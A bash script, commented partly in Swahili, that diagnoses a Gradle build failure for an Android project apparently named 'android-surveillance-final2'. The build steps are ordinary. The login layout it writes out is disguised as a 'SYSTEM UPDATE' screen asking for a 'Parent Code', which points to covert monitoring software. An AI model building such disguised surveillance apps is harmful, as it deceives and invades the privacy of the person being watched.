#!/bin/bash
cd ~/android-surveillance-final2

echo "🔧 KUREKEBISHA BUILD FAILURE..."
echo "=============================="

echo ""
echo "🔍 Checking build issues..."

# 1. Angalia kama kuna compilation errors
echo "📋 Compilation check..."
./gradlew clean
./gradlew compileDebugSources --no-daemon

if [ $? -ne 0 ]; then
    echo "❌ COMPILATION FAILED - There are code errors"
    echo "🔍 Checking specific errors..."
    
    # Try to find error messages
    ./gradlew assembleDebug --no-daemon --stacktrace 2>&1 | grep -i "error\|exception" | head -10
fi

# 2. Angalia kama kuna issues kwenye resources
echo ""
echo "📱 Checking resources..."
if [ -f "app/src/main/res/layout/activity_login.xml" ]; then
    echo "✅ Login layout exists"
else
    echo "❌ Login layout missing - creating basic one"
    mkdir -p app/src/main/res/layout
    cat > app/src/main/res/layout/activity_login.xml << 'LAYOUT'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="#1a1a1a"
    android:padding="20dp">

    <TextView
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="SYSTEM UPDATE"
        android:textColor="#ffffff"
        android:textSize="24sp"
        android:textStyle="bold"
        android:gravity="center"
        android:layout_marginTop="50dp"
        android:layout_marginBottom="30dp" />

    <EditText
        android:id="@+id/codeInput"
        android:layout_width="match_parent"
        android:layout_height="50dp"
        android:background="#333333"
        android:textColor="#ffffff"
        android:textSize="18sp"
        android:padding="10dp"
        android:maxLength="8"
        android:inputType="textCapCharacters"
        android:hint="Enter Parent Code (8 letters)"
        android:hintTextColor="#666666" />

    <Button
        android:id="@+id/submitButton"
        android:layout_width="match_parent"
        android:layout_height="50dp"
        android:text="SUBMIT CODE"
        android:textColor="#ffffff"
        android:background="#007acc"
        android:textSize="16sp"
        android:layout_marginTop="20dp" />

</LinearLayout>
LAYOUT
fi

# 3. Angalia kama kuna R.java imports missing
echo ""
echo "📦 Checking for missing resources..."
if grep -q "import com.security.update.R;" app/src/main/java/com/security/update/*.java 2>/dev/null; then
    echo "⚠️  Found R.java imports - might cause issues"
else
    echo "✅ No R.java import issues"
fi

# 4. Try building with more verbose output
echo ""
echo "🔨 Attempting detailed build..."
./gradlew clean
./gradlew assembleDebug --no-daemon --stacktrace --info 2>&1 | tail -20

echo ""
echo "🎯 BUILD STATUS:"
if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
    actual_size=$(du -b app/build/outputs/apk/debug/app-debug.apk | cut -f1)
    if [ "$actual_size" -gt 1000 ]; then
        echo "✅ BUILD SUCCESS - APK size: $(du -h app/build/outputs/apk/debug/app-debug.apk | cut -f1)"
    else
        echo "❌ BUILD FAILED - APK is empty or too small"
        echo "📊 Actual size: ${actual_size} bytes"
    fi
else
    echo "❌ BUILD FAILED - No APK file created"
fi
